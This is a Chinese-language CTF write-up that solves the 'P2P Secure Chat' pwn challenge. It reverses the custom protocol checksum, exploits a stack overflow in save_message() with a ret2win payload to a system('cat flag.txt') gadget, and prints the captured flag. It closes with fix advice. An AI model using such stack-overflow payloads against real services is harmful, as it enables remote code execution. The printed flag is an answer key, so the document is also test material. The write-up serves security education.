# putcCTF - P2P Secure Chat Writeup

## 题目信息
- **比赛**: putcCTF
- **题目**: P2P Secure Chat
- **类别**: Pwn
- **难度**: 简单
- **附件/URL**: `nc p2p.putcyberdays.pl 8080` / `server` / `protocol.h`
- **附件链接**: [下载附件](https://starnotes-xj.github.io/BIGC_CTF_Writeups/files/P2P%20Secure%20Chat/){target="_blank"} 路 [仓库位置](https://github.com/starnotes-xj/BIGC_CTF_Writeups/tree/main/CTF_Writeups/files/P2P%20Secure%20Chat){target="_blank"}
- **CTFtime**: [Event #3202](https://ctftime.org/event/3202/){target="_blank"}
- **Flag格式**: `putcCTF{...}`
- **状态**: 已解

## Flag

```text
putcCTF{W1ill_U_B3_my_friend?}
```

## 解题过程

### 1. 初始侦察 / 文件识别
- 远端服务连接后会给出一个简单菜单：

```text
=== P2P SECURE CHAT ===
1. Send Message
2. Read Conversation
3. Exit
Select >
```

- `2. Read Conversation` 会打印聊天记录，其中出现了一个很关键的提示：

```text
TODO: implement SECURE flag display
```

- 这说明 flag 很可能不在正常菜单逻辑里，而是要通过漏洞把执行流劫持到隐藏路径。
- `protocol.h` 给出了包头结构：

```c
typedef struct __attribute__((packed)) {
    uint32_t magic;
    uint32_t data_len;
    uint32_t checksum;
} PacketHeader;
```

- 也就是说发送消息时，客户端先发 12 字节包头，再发 `data_len` 指定长度的消息体。

### 2. 关键突破点一
- 静态分析 `server` 后，可以直接恢复发送消息的核心逻辑：
  1. 读取 12 字节头部
  2. 校验 `magic == 0xCAFEBABE`
  3. 校验 `data_len <= 0x400`
  4. `malloc(data_len)` 申请堆缓冲区
  5. 将消息体完整读入堆缓冲区
  6. 调用 `calculate_checksum()` 验证完整性
  7. 校验通过后进入 `save_message()`

- `calculate_checksum()` 的算法也很容易从反汇编中恢复：

```python
def checksum(data: bytes) -> int:
    c = 0x12345678
    for i, b in enumerate(data):
        signed = b - 256 if b >= 128 else b
        c ^= (signed << (i & 3)) & 0xffffffff
        c = ((c << 5) | (c >> 27)) & 0xffffffff
    return c & 0xffffffff
```

- 这一步很重要，因为如果 checksum 不对，服务端会直接拒绝消息：

```text
[-] Checksum mismatch! Integrity check failed.
```

### 3. 关键突破点二
- 真正的漏洞在 `save_message()`。其逻辑大致等价于：

```c
void save_message(char *username, char *msg, int len) {
    char local[0x50];
    memcpy(local, msg, len);
    FILE *fp = fopen("/tmp/chat_history.txt", "a");
    fprintf(fp, "%s: %s", username, local);
    ...
}
```

- `local` 只有 `0x50` 字节，但前面只检查了 `data_len <= 0x400`，没有把 `len` 限制在 `0x50` 以内。
- 因此这是一个非常直接的栈溢出，且目标程序保护较弱：
  - `No PIE`
  - `No canary`
  - `NX enabled`
  - `Partial RELRO`

- 该二进制还自带一个非常友好的隐藏 gadget：
  - `useful_gadgets = 0x401206`
  - 其中 `0x40120a` 开始的片段等价于：

```asm
lea rax, [rip + "cat flag.txt"]
mov rdi, rax
call system
pop rdi
ret
```

- 这意味着我们根本不需要自己构造复杂 ROP，只需要把返回地址改到 `0x40120a`，程序就会执行：

```bash
cat flag.txt
```

### 4. 获取 Flag
- 栈布局分析后，可得从 `local` 开始到保存的返回地址偏移是 `88` 字节：
  - `0x50` 字节本地缓冲区
  - `0x8` 字节保存的 `rbp`
  - 下一项就是保存的 `rip`

- 但这里还有一个细节：`fprintf(fp, "%s: %s", username, local)` 会把溢出后的 `local` 当 C 字符串打印。
- 如果消息体前 80 字节内没有 `\x00`，`fprintf` 会一路把栈上后续数据也当字符串读下去，容易在返回前先崩掉。
- 因此 payload 里要故意把第 80 字节做成 `\x00`，让日志写入阶段稳定结束，然后再利用后续溢出覆盖返回地址。

- 最终 payload 结构如下：

```python
body  = b"A" * 79
body += b"\x00"                  # 让 local 成为正常 C 字符串
body += b"B" * 8                 # 覆盖 saved rbp
body += p64(0x40120a)            # 跳到 system("cat flag.txt")
body += p64(0xdeadbeefdeadbeef)  # 给 pop rdi 消耗
body += p64(0x4016be)            # ret 回 main，保持栈链完整
```

- 将这个消息体配上正确 checksum 发给远端，返回：

```text
[+] Message saved to history.
putcCTF{W1ill_U_B3_my_friend?}
```

## 攻击链 / 解题流程总结

```text
连接远端观察菜单 -> 读取聊天记录发现隐藏 flag 线索 -> 用 protocol.h 还原包头格式 ->
静态分析 server 恢复 checksum 算法与消息处理流程 -> 发现 save_message 的 memcpy 栈溢出 ->
利用 useful_gadgets 中的 system("cat flag.txt") 片段构造 ret2win/ROP ->
发送合法 checksum 的恶意消息包 -> 远端直接回显 Flag
```

## 漏洞分析 / 机制分析

### 根因
- 程序只在协议层限制了 `data_len <= 0x400`，但没有在 `save_message()` 内再次校验目标栈缓冲区大小。
- `memcpy(local, msg, len)` 将用户可控长度的数据复制到固定 80 字节栈缓冲区，导致返回地址可控。
- 二进制未开启 PIE 与栈 canary，进一步降低了利用门槛。
- 程序中还内置了可直接执行 `system("cat flag.txt")` 的 gadget，几乎等于题目作者主动送了一条捷径。

### 影响
- 攻击者可覆盖返回地址并控制函数返回后的执行流。
- 在本题中，这一能力可直接转化为命令执行，并读取服务端 `flag.txt`。
- 如果这是实际服务，影响就是标准的远程代码执行。

### 修复建议
- 在 `save_message()` 中严格校验目标缓冲区长度，或改用 `snprintf` / `memcpy` 带边界保护的安全逻辑。
- 不要把用户输入长度与协议层长度检查混为一谈；每一层都应按目标缓冲区大小重新校验。
- 启用 `-fstack-protector`, PIE, Full RELRO 等基本保护。
- 删除测试/调试用 gadget，尤其是包含 `system("cat flag.txt")` 这类危险调用的死代码。

## 知识点
- 自定义协议逆向
- 栈溢出
- ret2win / 轻量级 ROP
- 基于静态分析恢复 checksum 算法

## 使用的工具
- `security-hub` MCP - 二进制信息与保护检查
- `pwntools` / `capstone` - 快速读取符号、反汇编函数
- Python `socket` - 构造自定义协议包并稳定复现利用

## 脚本归档
- Go：待补（预计文件名：`putcCTF_P2P_Secure_Chat.go`）
- Python：[`putcCTF_P2P_Secure_Chat.py` :material-open-in-new:](https://github.com/starnotes-xj/BIGC_CTF_Writeups/blob/main/CTF_Writeups/scripts_python/putcCTF_P2P_Secure_Chat.py){target="_blank"}
- 说明：脚本直接实现了 checksum 计算、payload 构造与远端交互，可一键复现拿 flag

## 命令行提取关键数据（无 GUI）

```bash
# 直接运行完整 exploit
python CTF_Writeups/scripts_python/putcCTF_P2P_Secure_Chat.py
```

## 推荐工具与优化解题流程

### 工具对比总结

| 工具 | 适用阶段 | 本题耗时 | 优点 | 缺点 |
|------|----------|----------|------|------|
| security-hub MCP | 二进制元信息确认 | 秒级 | 快速确认架构与保护 | 不能代替完整静态分析 |
| pwntools + capstone | 符号恢复与反汇编 | 分钟级 | 对小型 ELF 很高效 | 需要本地 Python 环境 |
| Python socket | 最终利用 | 秒级 | 无额外依赖，适合自定义协议 | 不如 pwntools 管道接口省事 |

### 推荐流程

**推荐流程**：先用远端菜单确认交互模型 -> 再用头文件恢复协议格式 -> 静态分析服务端找校验逻辑与危险函数 -> 最后用 Python 直接拼包打利用。

### 工具 A（推荐首选）
- **安装**: `pip install pwntools capstone`
- **详细步骤**:
  1. 读取 ELF 符号，定位 `handle_send_message`、`save_message`、`useful_gadgets`
  2. 反汇编恢复 checksum 算法与 RIP 偏移
  3. 构造合法协议包并远端验证
- **优势**: 小体积 ELF 基本可以分钟级打穿

### 工具 B（可选）
- **安装**: Python 3
- **详细步骤**:
  1. 手写 socket 客户端进入 `Send Message`
  2. 发送合法头部与恶意消息体
  3. 收取服务端回显 flag
- **优势**: 不依赖 gdb 或 pwntools，最贴合自定义协议场景
